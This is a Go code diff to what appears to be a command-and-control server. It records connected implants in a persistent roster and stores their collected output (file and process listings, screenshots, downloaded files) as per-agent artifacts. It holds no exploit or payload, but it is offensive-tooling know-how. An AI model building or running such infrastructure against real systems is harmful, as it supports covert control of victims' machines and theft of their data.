@@ -79,6 +79,10 @@ func (sm *SessionManager) Accept(conn net.Conn) *Session {
 
 	sm.bus.Publish(Event{Type: "implant_connected", ImplantID: id, Data: s.Addr})
 	fmt.Fprintf(logf(), "[core] implant %s connected\n", s)
+	// Record the agent in the persistent roster (upserts last_seen/addr).
+	if store != nil {
+		store.TouchAgent(id, s.Addr, time.Now().Unix())
+	}
 	go s.readLoop()
 	return s
 }
@@ -129,7 +133,13 @@ func (s *Session) readLoop() {
 		s.bus.Publish(Event{Type: et, ImplantID: s.ID, Data: m.Data})
 		// Correlate BOF output/error to the task that triggered it.
 		if et == "output" || et == "error" {
-			tasks.Feed(s.ID, et, m.Data)
+			bofName := tasks.Feed(s.ID, et, m.Data)
+			// Persist the output as a per-agent artifact (file_list/proc_list/
+			// screenshot/file_download) so the GUI can rehydrate history after
+			// a restart. Only captures successful output of known BOFs.
+			if et == "output" && store != nil && bofName != "" {
+				captureArtifact(bofName, s.ID, m.Data)
+			}
 		}
 		switch m.Type {
 		case "hello":
